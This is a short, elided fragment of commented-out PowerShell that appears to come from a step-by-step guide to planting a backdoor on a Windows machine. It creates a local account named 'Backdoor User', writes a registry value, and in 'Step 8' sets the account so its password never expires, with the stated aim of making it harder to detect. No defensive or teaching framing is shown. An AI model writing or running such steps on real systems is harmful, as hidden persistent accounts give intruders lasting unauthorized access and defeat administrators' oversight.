...
# New-LocalUser $username -Password $password -FullName "Backdoor User" -Description "Backdoor account"
...
# New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType String

# # Step 8: Hide the backdoor user account
# # To make the backdoor user account harder to detect, you can change its properties
# Set-LocalUser -Name $username -AccountNeverExpires:$true -PasswordNeverExpires:$true -UserMayNotChangePassword:$true
